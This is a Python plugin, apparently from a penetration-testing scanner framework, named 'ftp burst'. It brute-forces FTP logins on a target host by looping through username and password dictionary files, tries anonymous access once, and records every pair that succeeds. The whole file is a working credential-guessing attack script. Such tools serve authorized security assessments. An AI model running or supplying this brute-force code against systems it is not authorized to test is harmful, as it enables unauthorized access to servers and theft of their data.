#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import aioftp
import os
from lib.core.data import paths
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.FTP
        self.name = 'ftp burst'
        self.keyword = ['FTP','weakpasss']
        self.info = 'FTP burst'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        anonymous = False
        flag = 3
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'ftp_usernames.txt'))
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'ftp_passwords.txt'))
        async for (username, password) in self.generate_dict(usernamedic, passworddic):
            try:
                if username == 'anonymous':
                    if anonymous:
                        continue
                    else:
                        anonymous = True
                async with aioftp.ClientSession(self.target_host, self.target_port, username, password) as client:
                    self.flag = 1
                    self.req.append({"username": username, "password": password})
                    self.res.append({"info": username + "/" + password, "key": "ftp burst"})
            except Exception as e:
                if "timed out" in str(e):
                    if flag == 0:
                        return
                    flag -= 1